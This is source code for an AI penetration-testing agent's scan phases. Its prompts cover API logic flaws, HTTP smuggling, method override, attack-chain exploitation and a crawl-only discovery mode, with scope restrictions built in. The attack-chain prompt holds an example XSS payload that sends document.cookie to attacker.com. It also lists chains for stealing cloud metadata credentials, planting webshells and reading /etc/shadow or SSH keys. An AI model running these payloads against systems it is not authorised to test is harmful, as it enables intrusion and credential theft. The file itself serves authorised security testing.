            "Test for excessive data exposure. Follow these steps:\n\n"
            "STEP 1 — COMPARE UI vs API: For key pages (user profile, orders, settings),\n"
            "  compare what the UI shows vs what the API returns.\n"
            "  Extra fields in API response = data exposure.\n\n"
            "STEP 2 — LOOK FOR SENSITIVE DATA: Check API responses for:\n"
            "  - Passwords, password hashes, salts\n"
            "  - Internal IDs, database IDs, UUIDs\n"
            "  - Email addresses, phone numbers, addresses of OTHER users\n"
            "  - API keys, tokens, secrets\n"
            "  - Internal system information, IP addresses\n\n"
            "STEP 3 — LIST ENDPOINTS: Check user listing endpoints:\n"
            "  /api/users, /api/users?limit=100 — does it return all user data?\n"
            "  /api/search?q=* — mass data exposure?\n\n"
            "STEP 4 — VERBOSE ERRORS: Trigger errors and check if they expose:\n"
            "  - Database queries, table names\n"
            "  - File paths, server architecture\n"
            "  - Stack traces with source code"
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_business_logic",
        name="Business logic",
        prompt=(
            "Test API business logic flaws. Follow these steps:\n\n"
            "STEP 1 — IDENTIFY FLOWS: Find multi-step operations:\n"
            "  - Order: create cart → add items → checkout → payment\n"
            "  - Registration: submit info → verify email → activate\n"
            "  - Password reset: request → verify token → change\n\n"
            "STEP 2 — SKIP STEPS: Use api_request to:\n"
            "  - Jump directly to the final step without completing earlier ones\n"
            "  - Complete checkout without payment\n"
            "  - Activate account without email verification\n\n"
            "STEP 3 — PARAMETER TAMPERING: Modify prices, quantities, amounts:\n"
            "  - Set price to 0, -1, or 0.01\n"
            "  - Set quantity to -1, 99999, or 0\n"
            "  - Change currency, apply coupons multiple times\n\n"
            "STEP 4 — IDEMPOTENCY: Submit the same request twice.\n"
            "  Was the action applied twice? (double charge, double credit)\n\n"
            "STEP 5 — OUT-OF-ORDER: Perform actions in wrong sequence.\n"
            "  Does the API enforce proper ordering?"
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_race_condition",
        name="API Race Conditions",
        prompt=("Test API endpoints for race conditions. "
                "For every state-changing endpoint (POST, PUT, PATCH, DELETE) you discovered, "
                "send 5-10 concurrent identical requests and check if the operation was applied "
                "multiple times. Focus on: payment/transfer endpoints, resource creation, "
                "quota/limit decrements, approval/activation flows. "
                "Also test if the API supports idempotency keys — if so, verify they are enforced."),
        max_steps=25,
        applies_to="api",
    ),
    ScanPhase(
        id="api_bfla",
        name="API Function-Level Authorization",
        prompt=("Test for broken function-level authorization in the API. "
                "Identify admin/management endpoints from recon (paths with /admin/, /manage/, "
                "/internal/, /users/{id}/role, /settings/). "
                "Attempt to call them with the normal user's token. "
                "Try method switching (GET→DELETE, GET→PUT) on discovered endpoints. "
                "Check if adding admin-like query params (?role=admin, ?is_admin=1) bypasses auth. "
                "Test if documentation endpoints (/swagger, /openapi, /graphql) are accessible."),
        max_steps=20,
        applies_to="api",
    ),
    ScanPhase(
        id="api_host_header",
        name="API Host Header Injection",
        prompt=("Test API endpoints for host header injection. "
                "Send requests with modified Host, X-Forwarded-Host, and X-Forwarded-For headers. "
                "Check if responses contain reflected host values in URLs, HATEOAS links, "
                "or redirect headers. Test if X-Forwarded-For: 127.0.0.1 bypasses IP allowlists "
                "on restricted endpoints. Also check for different behavior with "
                "X-Original-URL and X-Rewrite-URL headers (path override attacks)."),
        max_steps=20,
        applies_to="api",
    ),
    ScanPhase(
        id="api_content_type",
        name="Content-Type Confusion & HTTP Smuggling",
        prompt=(
            "Test for content-type confusion and HTTP request smuggling.\n\n"
            "CONTENT-TYPE CONFUSION — for each POST/PUT/PATCH endpoint:\n"
            "(1) Send JSON body with Content-Type: application/xml — reveals XML parser.\n"
            "(2) Send JSON as application/x-www-form-urlencoded — may bypass JSON validation.\n"
            "(3) Send multipart/form-data with same fields — test if file upload is enabled.\n"
            "(4) Send text/plain — some CORS configs allow this without preflight.\n"
            "(5) Remove Content-Type entirely — check how server handles ambiguity.\n"
            "Different parsing = different validation = potential bypass.\n\n"
            "HTTP REQUEST SMUGGLING — use api_request_raw to send malformed requests:\n"
            "(1) CL.TE: Send request with both Content-Length and Transfer-Encoding: chunked. "
            "Set Content-Length shorter than actual body. If backend processes the smuggled portion "
            "as a new request, smuggling works.\n"
            "(2) TE.CL: Send Transfer-Encoding: chunked with Content-Length longer than chunks.\n"
            "(3) TE.TE: Obfuscate Transfer-Encoding header:\n"
            "  Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x\n"
            "  Transfer-Encoding: xchunked\n"
            "  Transfer-Encoding: chunked (with trailing space)\n"
            "Compare all responses to baseline. Timeouts, different status codes, or "
            "desynchronized responses indicate smuggling vulnerability (Critical severity)."
        ),
        max_steps=25,
        applies_to="api",
    ),
    ScanPhase(
        id="api_method_override",
        name="HTTP Method Override",
        prompt=("Test API endpoints for HTTP method override attacks. "
                "For each endpoint, check if method override headers are honored: "
                "(1) Send GET request with X-HTTP-Method-Override: DELETE — does it delete the resource? "
                "(2) Send POST with X-HTTP-Method: PUT — does it update instead of create? "
                "(3) Send GET with X-Method-Override: POST — does it execute the POST action? "
                "(4) Send POST with _method=DELETE in the body (Rails/Laravel convention). "
                "(5) Send GET with query parameter ?_method=PUT. "
                "If any of these change server behavior, it means method-based access control "
                "(e.g. 'only allow GET on this endpoint') can be bypassed. "
                "Focus on endpoints that restrict certain HTTP methods."),
        max_steps=20,
        applies_to="api",
    ),
]


ATTACK_CHAIN_PHASE = ScanPhase(
    id="attack_chain_analysis",
    name="Attack Chain Analysis",
    prompt=(
        "You have completed all individual scan phases. Now analyze your findings "
        "for EXPLOITABLE ATTACK CHAINS — combinations of 2+ vulnerabilities that "
        "together create a higher-severity impact than any single finding alone.\n\n"
        "Your findings so far:\n{findings_summary}\n\n"
        "## METHODOLOGY\n"
        "For each potential chain:\n"
        "1. **Identify** which findings can combine — look at URLs, parameters, and vuln types\n"
        "2. **Plan** the attack path: Step 1 (initial access) → Step 2 (escalation) → Step 3 (impact)\n"
        "3. **Execute** the chain using the `chain_exploit` tool — declare each step with its tool and args\n"
        "4. **Verify** the chain completed end-to-end by checking the chain_exploit result\n"
        "5. **Report** as a single finding with severity based on COMBINED impact\n\n"
        "## CHAIN PATTERNS (evaluate against YOUR findings)\n\n"
        "### Credential / Session Theft Chains\n"
        "- XSS + non-HttpOnly session cookie → inject `document.cookie` exfiltration script\n"
        "- XSS + CSRF-vulnerable form → inject auto-submit for password/email change\n"
        "- Open Redirect + OAuth/SSO callback → steal auth token by redirecting to attacker\n"
        "- Session fixation + XSS → fix victim's session, then hijack via reflected XSS\n"
        "- JWT alg:none + role claim → forge admin token, access privileged endpoints\n"
        "- Host header injection + password reset → poisoned reset link sent to victim\n\n"
        "### Data Exfiltration Chains\n"
        "- CORS misconfig + sensitive API endpoint → cross-origin fetch of authenticated data\n"
        "- IDOR + missing rate limit → enumerate all user records/documents at scale\n"
        "- SQLi + UNION SELECT → extract credentials table, use creds on admin login\n"
        "- Path traversal + known config path → read /etc/passwd, database.yml, .env files\n"
        "- API data exposure + GraphQL introspection → discover hidden fields, extract PII\n\n"
        "### Remote Code Execution Chains\n"
        "- File upload + path traversal → place webshell in executable directory\n"
        "- SSRF + cloud metadata (169.254.169.254) → steal IAM credentials, pivot to cloud\n"
        "- SSTI + unrestricted template context → execute OS commands via template injection\n"
        "- Command injection + sensitive file read → exfiltrate /etc/shadow or config secrets\n"
        "- XXE + internal file read → extract SSH keys or application secrets\n\n"
        "### Access Control Escalation Chains\n"
        "- BOLA (User A reads User B data) + privilege escalation → admin account takeover\n"
        "- API version downgrade + missing auth on old version → bypass new authentication\n"
        "- Content-type confusion + WAF bypass → submit malicious payload via alternate parser\n"
        "- Timing enumeration + no rate limit → confirm valid usernames + brute force passwords\n"
        "- Missing SameSite + CORS misconfig → cross-site authenticated state-changing request\n"
        "- Mass assignment + admin role field → self-promote to admin via hidden parameter\n\n"
        "## HOW TO USE chain_exploit\n"
        "Call chain_exploit with:\n"
        "- chain_name: descriptive name (e.g. 'XSS to Account Takeover')\n"
        "- steps: ordered array where each step has:\n"
        "  - tool: the tool to call (api_request, navigate, inject_payload, execute_js, etc.)\n"
        "  - args: arguments for that tool\n"
        "  - description: what this step achieves in the chain\n"
        "  - expect: (optional) expected indicator of success\n\n"
        "Example chain — XSS + Cookie Theft:\n"
        "  Step 1: inject_payload on vulnerable parameter with <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n"
        "  Step 2: get_cookies to confirm session cookie lacks HttpOnly\n"
        "  Step 3: execute_js to verify document.cookie contains the session ID\n\n"
        "## RULES\n"
        "- Use `chain_exploit` for every chain attempt — it records step-by-step evidence\n"
        "- Only report chains with PROOF from actual requests (not theoretical)\n"
        "- Each chain finding must reference the individual findings it combines by number\n"
        "- Set severity based on worst-case outcome of the FULL chain\n"
        "- A chain of two Low findings that achieves RCE = Critical\n"
        "- If no chains are exploitable, say so — don't force findings"
    ),
    max_steps=50,
    applies_to="both",
    parallel_ok=False,
)


# ---------------------------------------------------------------------------
# Parallel chain sub-phases: each focuses on one chain category so they can
# run concurrently, each in its own LLM conversation + browser context.
# ---------------------------------------------------------------------------

_CHAIN_PREAMBLE = (
    "You have completed all individual scan phases. Your ONLY job now is to "
    "find and PROVE exploitable attack chains in ONE specific category.\n\n"
    "Your findings so far:\n{findings_summary}\n\n"
    "## METHODOLOGY\n"
    "1. Review ALL findings above. Identify pairs/triples that can combine.\n"
    "2. Plan the attack path: Step 1 (initial access) -> Step 2 (escalation) -> Step 3 (impact)\n"
    "3. Execute using `chain_exploit` tool with ordered steps.\n"
    "4. Verify end-to-end. Report as a SINGLE finding with combined severity.\n\n"
    "## RULES\n"
    "- Use `chain_exploit` for every attempt — it records step-by-step evidence\n"
    "- Only report chains with PROOF from actual requests (not theoretical)\n"
    "- Reference individual findings by number\n"
    "- A chain of two Low findings that achieves RCE = Critical\n"
    "- If no chains are exploitable in your category, say so\n\n"
)

CHAIN_CREDENTIAL_THEFT = ScanPhase(
    id="chain_credential_theft",
    name="Chain: Credential / Session Theft",
    prompt=(
        _CHAIN_PREAMBLE +
        "## YOUR CATEGORY: Credential / Session Theft Chains\n"
        "Focus ONLY on these patterns:\n"
        "- XSS + non-HttpOnly session cookie -> steal document.cookie\n"
        "- XSS + CSRF-vulnerable form -> auto-submit password/email change\n"
        "- Open Redirect + OAuth/SSO callback -> steal auth token\n"
        "- Session fixation + XSS -> fix session then hijack\n"
        "- JWT alg:none + role claim -> forge admin token\n"
        "- Host header injection + password reset -> poisoned reset link\n"
    ),
    max_steps=30,
    applies_to="both",
    parallel_ok=True,
)

CHAIN_DATA_EXFIL = ScanPhase(
    id="chain_data_exfil",
    name="Chain: Data Exfiltration",
    prompt=(
        _CHAIN_PREAMBLE +
        "## YOUR CATEGORY: Data Exfiltration Chains\n"
        "Focus ONLY on these patterns:\n"
        "- CORS misconfig + sensitive API endpoint -> cross-origin fetch\n"
        "- IDOR + missing rate limit -> enumerate all user records\n"
        "- SQLi + UNION SELECT -> extract credentials, use on admin login\n"
        "- Path traversal + known config path -> read secrets files\n"
        "- API data exposure + GraphQL introspection -> extract PII\n"
    ),
    max_steps=30,
    applies_to="both",
    parallel_ok=True,
)

CHAIN_RCE = ScanPhase(
    id="chain_rce",
    name="Chain: Remote Code Execution",
    prompt=(
        _CHAIN_PREAMBLE +
        "## YOUR CATEGORY: Remote Code Execution Chains\n"
        "Focus ONLY on these patterns:\n"
        "- File upload + path traversal -> place webshell\n"
        "- SSRF + cloud metadata (169.254.169.254) -> steal IAM creds\n"
        "- SSTI + unrestricted context -> execute OS commands\n"
        "- Command injection + file read -> exfiltrate secrets\n"
        "- XXE + internal file read -> extract SSH keys\n"
    ),
    max_steps=30,
    applies_to="both",
    parallel_ok=True,
)

CHAIN_ACCESS_ESCALATION = ScanPhase(
    id="chain_access_escalation",
    name="Chain: Access Control Escalation",
    prompt=(
        _CHAIN_PREAMBLE +
        "## YOUR CATEGORY: Access Control Escalation Chains\n"
        "Focus ONLY on these patterns:\n"
        "- BOLA + privilege escalation -> admin account takeover\n"
        "- API version downgrade + missing auth -> bypass authentication\n"
        "- Content-type confusion + WAF bypass -> deliver payload\n"
        "- Timing enumeration + no rate limit -> brute force\n"
        "- Missing SameSite + CORS misconfig -> cross-site state change\n"
        "- Mass assignment + admin role field -> self-promote to admin\n"
    ),
    max_steps=30,
    applies_to="both",
    parallel_ok=True,
)

CHAIN_SUB_PHASES: list[ScanPhase] = [
    CHAIN_CREDENTIAL_THEFT,
    CHAIN_DATA_EXFIL,
    CHAIN_RCE,
    CHAIN_ACCESS_ESCALATION,
]

# Reactive chain triggers: when a finding of a given OWASP category appears,
# these chain sub-phases become relevant. Used by the orchestrator to decide
# which chain agents to spawn based on actual findings.
REACTIVE_CHAIN_TRIGGERS: dict[str, list[str]] = {
    "xss":       ["chain_credential_theft"],
    "sqli":      ["chain_data_exfil", "chain_rce"],
    "ssrf":      ["chain_rce"],
    "ssti":      ["chain_rce"],
    "cmdi":      ["chain_rce"],
    "xxe":       ["chain_rce", "chain_data_exfil"],
    "idor":      ["chain_data_exfil", "chain_access_escalation"],
    "bola":      ["chain_access_escalation"],
    "cors":      ["chain_data_exfil", "chain_credential_theft"],
    "csrf":      ["chain_credential_theft"],
    "redirect":  ["chain_credential_theft"],
    "jwt":       ["chain_credential_theft", "chain_access_escalation"],
    "upload":    ["chain_rce"],
    "traversal": ["chain_data_exfil", "chain_rce"],
    "auth":      ["chain_access_escalation"],
    "mass_assign": ["chain_access_escalation"],
    "graphql":   ["chain_data_exfil"],
}


_FOCUS_PHASE_MAP: dict[str, set[str]] = {
    "xss":          {"web_a03_xss", "api_injection"},
    "sqli":         {"web_a03_sqli", "api_injection"},
    "sql injection": {"web_a03_sqli", "api_injection"},
    "nosql":        {"web_a03_sqli", "api_injection"},
    "cmdi":         {"web_a03_cmdi", "api_injection"},
    "command injection": {"web_a03_cmdi", "api_injection"},
    "ssti":         {"web_a03_ssti", "api_injection"},
    "path traversal": {"web_a03_path_traversal", "api_injection"},
    "lfi":          {"web_a03_path_traversal", "api_injection"},
    "directory traversal": {"web_a03_path_traversal", "api_injection"},
    "xxe":          {"web_a03_xxe", "api_injection"},
    "xml":          {"web_a03_xxe", "api_injection", "api_content_type"},
    "ssrf":         {"web_a10", "api_ssrf"},
    "idor":         {"web_a01", "api_authz"},
    "bola":         {"web_a01", "api_authz"},
    "auth":         {"web_a07", "api_auth"},
    "authentication": {"web_a07", "api_auth"},
    "access control": {"web_a01", "api_authz", "web_bfla", "api_bfla"},
    "csrf":         {"web_extras"},
    "misconfig":    {"web_a05"},
    "crypto":       {"web_a02"},
    "graphql":      {"api_graphql"},
    "rate limit":   {"api_rate_limit"},
    "mass assignment": {"api_mass_assign"},
    "business logic": {"web_a04", "web_extras", "api_business_logic", "web_race_condition", "api_race_condition"},
    "data exposure": {"api_data_exposure"},
    "race condition": {"web_race_condition", "api_race_condition"},
    "host header":  {"web_host_header", "api_host_header"},
    "timing":       {"web_timing_enum"},
    "enumeration":  {"web_timing_enum"},
    "bfla":         {"web_bfla", "api_bfla"},
    "authorization": {"web_a01", "api_authz", "web_bfla", "api_bfla"},
    "file upload":  {"web_file_upload"},
    "upload":       {"web_file_upload", "web_extras"},
    "password reset": {"web_password_reset"},
    "session":      {"web_session_mgmt"},
    "smuggling":    {"api_content_type"},
    "http smuggling": {"api_content_type"},
    "session management": {"web_session_mgmt"},
    "content type": {"api_content_type"},
    "method override": {"api_method_override"},
    "chain": {"attack_chain_analysis"},
    "attack chain": {"attack_chain_analysis"},
    "llm": {"web_llm_security"},
    "llm security": {"web_llm_security"},
    "chatbot": {"web_llm_security"},
    "prompt injection": {"web_llm_security"},
}

_RECON_PHASE_IDS = {"web_recon", "api_recon"}


def _resolve_focus_phases(focus_areas: list[str]) -> set[str] | None:
    """Map user-friendly focus area names to the set of phase IDs to keep.

    Returns None if focus_areas is empty (= run everything).
    Always includes recon phases so the LLM has context.
    """
    if not focus_areas:
        return None
    matched: set[str] = set()
    for area in focus_areas:
        key = area.strip().lower()
        if key in _FOCUS_PHASE_MAP:
            matched |= _FOCUS_PHASE_MAP[key]
        else:
            for map_key, phase_ids in _FOCUS_PHASE_MAP.items():
                if key in map_key or map_key in key:
                    matched |= phase_ids
    if not matched:
        return None
    matched |= _RECON_PHASE_IDS
    return matched


# ---------------------------------------------------------------------------
# Crawl-only phase (Acunetix-style "Crawl Only" scan type)
#
# When scan_profile == "crawl_only" the agent runs this phase INSTEAD of the
# full OWASP test suite. The goal is pure discovery: exercise the app
# (including SPA routes + dynamic XHRs) broadly enough that the user can
# verify from the existing "Crawled Endpoints", "Out of Scope", and
# "AI AGENT COVERAGE" UI whether the scanner can reach everything before
# committing to a full vulnerability scan.
#
# EXPLICITLY PROHIBITED: any form of payload injection (XSS, SQLi, command
# injection, SSRF, path traversal, template injection, prototype pollution,
# XXE, etc.), auth-bypass attempts, token tampering, BOLA/BFLA enumeration,
# rate-limit probes, destructive HTTP verbs against state-changing endpoints.
#
# PASSIVE checks (TLS, security headers, JS library CVE lookup, CSP/CORS/
# HSTS/clickjacking) still run — those happen automatically in the
# passive_recon pipeline and don't send attack payloads. Per-phase host-
# delta passive audit also still runs at the end of this phase.
# ---------------------------------------------------------------------------
CRAWL_ONLY_PHASE = ScanPhase(
    id="crawl_only",
    name="Crawl (Discovery Only — No Vulnerability Testing)",
    prompt=(
        "You are running in CRAWL-ONLY mode. Your ONLY job is to discover "
        "URLs, SPA routes, forms, API endpoints, hosts, and technologies. "
        "DO NOT test for vulnerabilities of any kind.\n\n"
        "ABSOLUTE RULES (violating these is a scan failure):\n"
        "1. DO NOT inject any payloads — no XSS strings, SQL strings, "
        "command-injection strings, template strings, path-traversal "
        "strings, SSRF targets, XXE entities, prototype-pollution keys, "
        "or any deliberately malformed values.\n"
        "2. DO NOT attempt auth bypass, JWT tampering, session fixation, "
        "privilege escalation, BOLA/BFLA enumeration, or rate-limit probes.\n"
        "3. DO NOT call fuzz_parameter, replay_with_modification with "
        "malicious values, test_auth_bypass, test_method_override, "
        "test_token_security, or chain_exploit.\n"
        "4. For forms, you MAY submit with REALISTIC benign dummy values "
        "(e.g. 'john.doe@example.com' in an email field, 'test-query' in "
        "a search box) ONLY when it's needed to discover downstream pages "
        "or API calls. Never submit anything that looks like an attack.\n"
        "5. DO NOT DELETE, UPDATE, or perform any destructive action. "
        "Prefer GET over POST. If a form is clearly destructive "
        "(delete-account, transfer-funds, admin actions), SKIP it.\n\n"
        "WHAT YOU SHOULD DO:\n\n"
        "STEP 1 — FRAMEWORK DETECTION: Use execute_js to check for SPA "
        "framework globals (window.ng, window.__NEXT_DATA__, "
        "window.__NUXT__, window.React). Note which framework the app uses.\n\n"
        "STEP 2 — START NETWORK CAPTURE: Call intercept_requests('*') "
        "FIRST so every XHR/fetch the app makes is captured.\n\n"
        "STEP 3 — BROAD NAVIGATION (click EVERY primary nav item, even if it looks redundant):\n"
        "  - Call get_links to enumerate <a href> targets\n"
        "  - For SPAs: execute_js to extract routes from Angular "
        "(document.querySelectorAll('[routerLink]')), React Router, Vue "
        "Router. Also search main JS bundles for 'path:' patterns and "
        "/api/, /rest/, /v1/, /v2/ URL literals.\n"
        "  - NAVIGATE to every distinct route/link/navbar item/sidebar "
        "entry/footer link you find. After each navigation call "
        "wait_for_spa_route and get_network_log to capture triggered "
        "XHRs.\n"
        "  - **CLICK EVERY ITEM in the primary navigation**: top menu bar, "
        "sidebar, tabs, dashboard tiles/cards, dropdown menus, hamburger/"
        "drawer menus, 'My [Feature]' buttons, product-switcher links. "
        "Modern SPAs aggressively code-split: the main bundle only contains "
        "routes for the landing page, and each feature (Backup, Licensing, "
        "Devices, Storage, Billing, Settings, Account, Profile, Orders, "
        "Reports, etc.) has its OWN lazy-loaded JS chunk that is ONLY "
        "fetched when the user clicks into that feature. Those chunks "
        "contain the API hostnames for that feature (e.g. "
        "`web-int.backup.example.com`, `licensing-int.example.com`) and "
        "those hostnames WILL NOT BE DISCOVERED unless you actually click "
        "the feature link. Treat every visible top-level nav item as a "
        "required click, even if it looks redundant with something you've "
        "already visited.\n"
        "  - After each click, wait ~2s for the lazy chunk to load, then "
        "call get_network_log and note any new hostnames or XHR base URLs. "
        "Call get_links again from the feature's landing page — each "
        "feature usually has its own sub-nav.\n"
        "  - Click benign UI elements (menus, tabs, dropdowns, 'show "
        "more', pagination, filter toggles) to surface lazy-loaded "
        "content. Do NOT click clearly destructive buttons.\n\n"
        "STEP 4 — FORM ENUMERATION: Call get_forms on every page you "
        "land on. Record the action URL, method, and field names. Submit "
        "a form ONLY when benign dummy values will reveal additional "
        "routes/APIs (e.g. a search form → results page).\n\n"
        "STEP 5 — API SURFACE: Use api_request GET on common API base "
        "paths (/api, /api/, /rest, /rest/, /graphql, /swagger-ui/, "
        "/api-docs, /v1, /v2, /.well-known/openapi.json). For each base "
        "that returns 200, attempt one GET to list-style children. "
        "Extract additional endpoints from the JS bundle via execute_js "
        "(fetch( / $.ajax / axios. / http.get literals).\n\n"
        "STEP 6 — HIDDEN RESOURCES (GET only): /robots.txt, /sitemap.xml, "
        "/.well-known/security.txt, /humans.txt, /crossdomain.xml, "
        "/clientaccesspolicy.xml. Note what's there — don't attempt any "
        "sensitive-file reads (no /.env, /.git/, /backup.sql etc — those "
        "are tested by passive recon when appropriate).\n\n"
        "STEP 7 — TECHNOLOGY FINGERPRINT: Note Server, X-Powered-By, and "
        "framework-specific cookies / response shapes. Call get_cookies "
        "once to record cookies set (names only — do NOT try to manipulate "
        "them).\n\n"
        "STEP 8 — SUB-DOMAIN / SIBLING-HOST COVERAGE (CRITICAL):\n"
        "  - After every few navigations, call get_network_log and look "
        "at the host part of each logged URL.\n"
        "  - Any hostname you see that is IN-SCOPE (same registrable "
        "domain as the target) but that you haven't yet visited is a "
        "sibling host you MUST also crawl. Call navigate('https://<host>/') "
        "on it, then repeat STEPs 3–6 (links, forms, API surface, hidden "
        "resources) on that host.\n"
        "  - Typical SPA pattern: the landing page is served from "
        "app.example.com but XHRs go to api.example.com, auth.example.com, "
        "static.example.com. All of those must be crawled.\n"
        "  - Sibling hosts are ALSO surfaced automatically by the platform "
        "from JS-bundle string literals (the content-harvester grabs "
        "https://<host> references from every JS/HTML/JSON response body "
        "the browser receives). If the platform injects an 'ADDITIONAL "
        "IN-SCOPE SUB-DOMAINS (MUST COVER)' block at the start of a phase, "
        "those hosts are authoritative — navigate to each one before "
        "finishing.\n"
        "  - Cap: crawl up to 10 sibling hosts; if more appear, log them "
        "but don't recurse further.\n\n"
        "OUTPUT: You do NOT need to produce vulnerability findings. The "
        "scan's value in this mode comes entirely from the network log, "
        "crawled endpoint list, and coverage counters that the platform "
        "collects automatically from your tool calls. Keep crawling "
        "broadly until you've explored every navigation surface you can "
        "find, then stop.\n\n"
        "MINIMUM REQUIREMENT: before finishing you MUST have visited at "
        "least 15 distinct URLs/routes or called intercept_requests plus "
        "get_network_log to verify no more XHRs are being triggered. If "
        "you finish with fewer than 15 distinct URLs, the coverage check "
        "will flag the scan as insufficient."
    ),
    max_steps=80,
    applies_to="both",
)

# ---------------------------------------------------------------------------
# LLM Application Security phase -- runs deterministic probes (llm_baseline)
# and optionally Garak.  This phase does NOT use the normal LLM agent loop;
# the orchestrator intercepts it by phase ID and calls the dedicated runner.
# ---------------------------------------------------------------------------
LLM_SECURITY_PHASE = ScanPhase(
    id="web_llm_security",
    name="LLM Application Security (OWASP LLM Top 10)",
    prompt=(
        "This phase tests LLM-powered features (chatbots, AI assistants) "
        "for prompt injection, data leakage, excessive agency, and other "
        "OWASP LLM Top 10 vulnerabilities using deterministic probe batteries."
    ),
    max_steps=1,
    applies_to="website",
    parallel_ok=False,
)


def get_phases(scan_mode: str, app_info: dict | None = None,
               scan_scope: str = "directory",
               focus_areas: list[str] | None = None,
               scan_profile: str = "vulnerability_scan") -> list[ScanPhase]:
    """Return the list of scan phases for this run.

    When ``scan_profile == "crawl_only"`` the only phase returned is
    ``CRAWL_ONLY_PHASE`` — all OWASP vulnerability-test phases and the
    attack-chain phase are skipped. Passive recon + per-phase host-delta
    passive audit still run around the phase loop (they live outside
    ``get_phases``) so the user still gets TLS / security-header / JS-CVE
    findings in crawl-only mode.

    ``focus_areas`` is ignored in crawl-only mode (mixing focus_areas with
    crawl-only makes no sense — focus_areas selects vuln categories to
    test, and crawl-only tests nothing).
    """
    app_info = app_info or {}

    if scan_profile == "crawl_only":
        return [CRAWL_ONLY_PHASE]

    phases: list[ScanPhase] = []
    has_websockets = app_info.get("has_websockets", True)

    skip_recon = scan_scope == "url_only" and not focus_areas
    allowed_ids = _resolve_focus_phases(focus_areas or [])

    if scan_mode in ("website", "both"):
        for p in WEB_PHASES:
            if skip_recon and p.id == "web_recon":
                continue
            if p.id == "web_websocket" and not has_websockets:
                continue
            if allowed_ids is not None and p.id not in allowed_ids:
                continue
            phases.append(p)

    if scan_mode in ("api", "both"):
        for p in API_PHASES:
            if skip_recon and p.id == "api_recon":
                continue
            if allowed_ids is not None and p.id not in allowed_ids:
                continue
            phases.append(p)

    # Conditionally add LLM security phase when LLM features are detected
    # or when the user explicitly requests it via focus_areas.
    _has_llm = app_info.get("has_llm_chat", False)
    _llm_forced = allowed_ids is not None and "web_llm_security" in allowed_ids
    if (_has_llm or _llm_forced) and scan_mode in ("website", "both"):
        phases.append(LLM_SECURITY_PHASE)

    if phases and (allowed_ids is None or "attack_chain_analysis" in allowed_ids):
        phases.append(ATTACK_CHAIN_PHASE)

    return phases


def build_system_prompt(
    target: Any,
    endpoint_registry: Any,
    app_info: dict | None = None,
    extra_domains: list[str] | None = None,
) -> str:
    parts: list[str] = [SYSTEM_PROMPT]
    url = getattr(target, "url", "")
    scan_mode = getattr(target, "scan_mode", "both")

    from urllib.parse import urlparse

    from scanners.ai_agent.agent import _build_allowed_domains, _extract_base_domain
    target_host = (urlparse(url).hostname or "").lower()
    extra_set = set(d.strip().lower() for d in extra_domains if d.strip()) if extra_domains else None
    allowed = _build_allowed_domains(url, extra_set)
    scope_str = ", ".join(f"*.{d}" for d in sorted(allowed))

    scan_scope = getattr(target, "scan_scope", "directory")
    focus_urls = getattr(target, "focus_urls", None) or []

    parts.append(f"\n\nTarget: {url}")
    parts.append(f"Scan mode: {scan_mode}")
    parts.append(f"SCOPE: Only scan URLs under these domains: {scope_str}. Do NOT request any third-party domains (CDNs, analytics, trackers, etc). Any out-of-scope URL will be automatically blocked.")

    if scan_scope == "url_only":
        parts.append(
            "\n\n*** URL-ONLY SCOPE ***\n"
            "CRITICAL RESTRICTION: You must ONLY test the exact URL(s) listed below. "
            "Do NOT crawl, do NOT follow links, do NOT discover other pages or endpoints. "
            "Focus all your testing effort on these specific URL(s) only:\n"
        )
        targets = focus_urls if focus_urls else [url]
        for u in targets:
            parts.append(f"  - {u}")
        parts.append(
            "\nSkip any reconnaissance/crawling phase. Go directly to security testing "
            "on the URL(s) above. Test all applicable vulnerability classes on these "
            "specific URL(s)."
        )
    elif scan_scope == "directory":
        parsed_path = urlparse(url).path.rstrip("/")
        parts.append(
            f"\n\nDIRECTORY SCOPE: Limit scanning to {url} and its sub-paths "
            f"(anything under {parsed_path}/). Do NOT crawl outside this directory. "
            "Keep reconnaissance lightweight — only discover pages under this path prefix."
        )
        if focus_urls:
            parts.append("Additionally, prioritize these specific URLs:")
            for u in focus_urls:
                parts.append(f"  - {u}")
    else:
        if focus_urls:
            parts.append("\nPrioritize testing these specific URLs first:")
            for u in focus_urls:
                parts.append(f"  - {u}")
            parts.append("Then continue with full-site crawl and testing.")

    if scan_mode in ("api", "both") and endpoint_registry is not None:
        get_all = getattr(endpoint_registry, "get_all", None)
        eps = get_all() if callable(get_all) else []
        if eps:
            parts.append(f"\nImported/discovered API endpoints: {len(eps)}")
            for ep in eps[:20]:
                method = getattr(ep, "method", "?")
                path = getattr(ep, "path", "?")
                parts.append(f"  - {method} {path}")
            if len(eps) > 20:
                parts.append(f"  ... and {len(eps) - 20} more")

    focus_areas = getattr(target, "focus_areas", None) or []
    if focus_areas:
        areas_str = ", ".join(focus_areas)
        parts.append(
            f"\n\n*** FOCUS AREA RESTRICTION ***\n"
            f"You must ONLY test for: {areas_str}.\n"
            f"Do NOT test for any other vulnerability class. Skip all unrelated checks.\n"
            f"Focus 100% of your effort on {areas_str} and directly related relevance checks "
            f"(e.g., for XSS: input reflection, output encoding, DOM manipulation, CSP bypass; "
            f"for SQLi: error-based, blind, time-based, union-based).\n"
            f"If a page or endpoint is not relevant to {areas_str}, skip it immediately."
        )

    exclude_urls = getattr(target, "exclude_urls", None) or []
    if exclude_urls:
        parts.append(
            "\n\n*** EXCLUDED URLs / PATHS ***\n"
            "The user has explicitly excluded the following URLs/paths from scanning. "
            "You MUST NOT navigate to, crawl, test, or send any requests to these. "
            "Skip them entirely — any attempt will be automatically blocked:\n"
        )
        for u in exclude_urls:
            parts.append(f"  - {u}")
        parts.append(
            "\nIf you encounter links pointing to excluded URLs, ignore them. "
            "Do not include excluded URLs in any test payloads or redirect targets."
        )

    scan_intensity = getattr(target, "scan_intensity", "deep")
    if scan_intensity == "light":
        parts.append(
            "\n\n*** SCAN INTENSITY: LIGHT ***\n"
            "This is a quick reconnaissance-level scan. Be fast and efficient:\n"
            "- Per input/parameter: test 3-5 payloads maximum per vulnerability class\n"
            "- Use only the most common/effective payloads (top canonical examples)\n"
            "- Skip edge cases and encoding variations (EXCEPT for XSS — always try WAF bypass payloads for XSS: case variation, event handlers, SVG/IMG tags, encoding tricks)\n"
            "- Max 15 actions per page/endpoint. Move on quickly if no obvious indicator\n"
            "- Prioritize breadth over depth — check more pages with fewer payloads each\n"
            "- Skip low-severity checks (info-level headers, verbose errors, etc.)"
        )
    elif scan_intensity == "standard":
        parts.append(
